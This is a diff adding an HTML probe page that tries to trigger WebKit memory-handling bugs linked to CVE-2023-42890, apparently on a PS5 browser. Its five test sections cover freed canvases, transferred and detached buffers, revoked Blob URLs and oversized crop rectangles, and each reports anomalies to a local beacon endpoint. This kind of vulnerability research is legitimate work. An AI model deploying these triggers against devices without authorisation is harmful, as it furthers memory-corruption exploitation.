@@ -1,0 +1,275 @@
+<!--
+  p693: CVE-2023-42890 -- WebKit memory handling (Pwn2car)
+  Adapted for PS5 guide-entry beacon API (POST /api/beacon)
+  CRASH_CLASS: MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p693</title></head>
+<body><pre id="out">p693: CVE-2023-42890 memory handling (Pwn2car)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+var _sid='p693-'+Date.now();
+function say(s){O.textContent+='\n'+s;}
+function b(m){
+  var msg='P693-'+m;
+  say(msg);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('POST','/api/beacon',false);
+    x.setRequestHeader('Content-Type','application/json');
+    x.send(JSON.stringify({stage:'p693',msg:msg,level:'info',sid:_sid,ua:navigator.userAgent}));
+  }catch(e){
+    try{new Image().src='/beacon?m='+encodeURIComponent(msg)+'&t='+Date.now();}catch(e2){}
+  }
+}
+
+function main(){
+  b('START:CVE-2023-42890-MEMORY-HANDLING');
+  var results = [];
+  var done = 0;
+  var total = 5;
+
+  function checkDone() {
+    done++;
+    if (done >= total) {
+      if (results.length > 0) {
+        b('RESULT:HITS=' + results.join(';'));
+      } else {
+        b('RESULT:NO-BUG-DETECTED');
+      }
+      b('DONE');
+    }
+  }
+
+  // === SECTION A: ImageBitmap from removed canvas ===
+  b('A:IMAGEBITMAP-REMOVED-CANVAS');
+  try {
+    var canvas = document.createElement('canvas');
+    canvas.width = 256;
+    canvas.height = 256;
+    var ctx = canvas.getContext('2d');
+    ctx.fillStyle = 'red';
+    ctx.fillRect(0, 0, 256, 256);
+    ctx.fillStyle = 'blue';
+    ctx.fillRect(50, 50, 100, 100);
+    document.body.appendChild(canvas);
+
+    var canvasRef = canvas;
+    createImageBitmap(canvas).then(function(bitmap) {
+      b('A:BITMAP-CREATED:' + bitmap.width + 'x' + bitmap.height);
+
+      canvasRef.remove();
+      canvasRef = null;
+      ctx = null;
+
+      for (var i = 0; i < 5000; i++) new ArrayBuffer(1024);
+
+      var canvas2 = document.createElement('canvas');
+      canvas2.width = 256;
+      canvas2.height = 256;
+      var ctx2 = canvas2.getContext('2d');
+      try {
+        ctx2.drawImage(bitmap, 0, 0);
+        var pixel = ctx2.getImageData(75, 75, 1, 1).data;
+        b('A:PIXEL:' + pixel[0] + ',' + pixel[1] + ',' + pixel[2] + ',' + pixel[3]);
+        if (pixel[2] !== 255) {
+          b('A:WRONG-PIXEL');
+          results.push('A:wrong-pixel');
+        }
+      } catch(e2) {
+        b('A:DRAW-ERR:' + e2.message);
+        results.push('A:err');
+      }
+
+      bitmap.close();
+      canvas2.remove();
+      checkDone();
+    }).catch(function(e) {
+      b('A:BITMAP-ERR:' + e.message);
+      checkDone();
+    });
+  } catch(e) {
+    b('A:ERR:' + e.message);
+    checkDone();
+  }
+
+  // === SECTION B: OffscreenCanvas transfer ===
+  b('B:OFFSCREEN-CANVAS');
+  try {
+    if (typeof OffscreenCanvas !== 'undefined') {
+      var osc = new OffscreenCanvas(128, 128);
+      var octx = osc.getContext('2d');
+      octx.fillStyle = 'green';
+      octx.fillRect(0, 0, 128, 128);
+
+      var bitmapPromise = osc.transferToImageBitmap();
+      b('B:TRANSFERRED');
+
+      try {
+        octx.fillStyle = 'red';
+        octx.fillRect(0, 0, 64, 64);
+        b('B:POST-TRANSFER-DRAW:OK');
+      } catch(e2) {
+        b('B:POST-TRANSFER-DRAW-ERR:' + e2.message);
+      }
+
+      for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
+
+      try {
+        var c2 = document.createElement('canvas');
+        c2.width = 128;
+        c2.height = 128;
+        var ct2 = c2.getContext('2d');
+        ct2.drawImage(bitmapPromise, 0, 0);
+        var px = ct2.getImageData(10, 10, 1, 1).data;
+        b('B:BITMAP-PIXEL:' + px[0] + ',' + px[1] + ',' + px[2]);
+        c2.remove();
+      } catch(e2) {
+        b('B:USE-ERR:' + e2.message);
+      }
+      checkDone();
+    } else {
+      b('B:NO-OFFSCREENCANVAS');
+      checkDone();
+    }
+  } catch(e) {
+    b('B:ERR:' + e.message);
+    checkDone();
+  }
+
+  // === SECTION C: Blob URL revoked during fetch ===
+  b('C:BLOB-URL-REVOKE');
+  try {
+    var parts = [];
+    for (var i = 0; i < 100; i++) {
+      parts.push(new ArrayBuffer(65536));
+    }
+    var blob = new Blob(parts);
+    var url = URL.createObjectURL(blob);
+    b('C:BLOB-URL:size=' + blob.size);
+
+    var fetchPromise = fetch(url);
+
+    URL.revokeObjectURL(url);
+    b('C:REVOKED');
+
+    blob = null;
+    parts = null;
+
+    for (var i = 0; i < 5000; i++) new ArrayBuffer(1024);
+
+    fetchPromise.then(function(resp) {
+      b('C:FETCH-OK:status=' + resp.status);
+      return resp.arrayBuffer();
+    }).then(function(buf) {
+      b('C:BODY-SIZE:' + buf.byteLength);
+      var view = new Uint8Array(buf);
+      var nonzero = 0;
+      for (var i = 0; i < Math.min(view.length, 1000); i++) {
+        if (view[i] !== 0) nonzero++;
+      }
+      b('C:NONZERO-IN-FIRST-1K:' + nonzero);
+      if (nonzero > 0) {
+        b('C:UNEXPECTED-DATA');
+        results.push('C:unexpected');
+      }
+      checkDone();
+    }).catch(function(e) {
+      b('C:FETCH-ERR:' + e.message);
+      checkDone();
+    });
+  } catch(e) {
+    b('C:ERR:' + e.message);
+    checkDone();
+  }
+
+  // === SECTION D: createImageBitmap with OOB crop rect ===
+  b('D:BITMAP-OOB-CROP');
+  try {
+    var canvas3 = document.createElement('canvas');
+    canvas3.width = 64;
+    canvas3.height = 64;
+    var ctx3 = canvas3.getContext('2d');
+    ctx3.fillStyle = '#FF0000';
+    ctx3.fillRect(0, 0, 64, 64);
+
+    var crops = [
+      { x: -100, y: -100, w: 300, h: 300 },
+      { x: 32, y: 32, w: 128, h: 128 },
+      { x: 0, y: 0, w: 2147483647, h: 1 },
+      { x: 0, y: 0, w: 1, h: 2147483647 },
+    ];
+
+    var cropDone = 0;
+    for (var i = 0; i < crops.length; i++) {
+      (function(idx, crop) {
+        createImageBitmap(canvas3, crop.x, crop.y, crop.w, crop.h).then(function(bm) {
+          b('D:CROP-' + idx + ':OK:' + bm.width + 'x' + bm.height);
+          bm.close();
+          cropDone++;
+          if (cropDone >= crops.length) { canvas3.remove(); checkDone(); }
+        }).catch(function(e) {
+          b('D:CROP-' + idx + ':ERR:' + e.message);
+          cropDone++;
+          if (cropDone >= crops.length) { canvas3.remove(); checkDone(); }
+        });
+      })(i, crops[i]);
+    }
+  } catch(e) {
+    b('D:ERR:' + e.message);
+    checkDone();
+  }
+
+  // === SECTION E: TextEncoder with detached ArrayBuffer ===
+  b('E:ENCODER-DETACHED');
+  try {
+    var enc = new TextEncoder();
+    var buf = new ArrayBuffer(4096);
+    var view = new Uint8Array(buf);
+
+    var result = enc.encodeInto('Hello World! '.repeat(100), view);
+    b('E:ENCODED:read=' + result.read + ',written=' + result.written);
+
+    try {
+      var msg = new MessageChannel();
+      msg.port1.postMessage(buf, [buf]);
+      b('E:TRANSFERRED:detached=' + (buf.byteLength === 0));
+
+      try {
+        var dec = new TextDecoder();
+        var text = dec.decode(view);
+        b('E:DECODE-DETACHED:len=' + text.length);
+        if (text.length > 0) {
+          b('E:UNEXPECTED-DECODE-SUCCESS');
+          results.push('E:detached-read');
+        }
+      } catch(e2) {
+        b('E:DECODE-DETACHED-ERR:' + e2.message);
+      }
+
+      try {
+        var r2 = enc.encodeInto('test', view);
+        b('E:ENCODE-DETACHED:written=' + r2.written);
+        if (r2.written > 0) {
+          results.push('E:detached-write');
+        }
+      } catch(e2) {
+        b('E:ENCODE-DETACHED-ERR:' + e2.message);
+      }
+
+      msg.port1.close();
+      msg.port2.close();
+    } catch(e2) {
+      b('E:TRANSFER-ERR:' + e2.message);
+    }
+    checkDone();
+  } catch(e) {
+    b('E:ERR:' + e.message);
+    checkDone();
+  }
+}
+
+setTimeout(main, 200);
+</script></body></html>
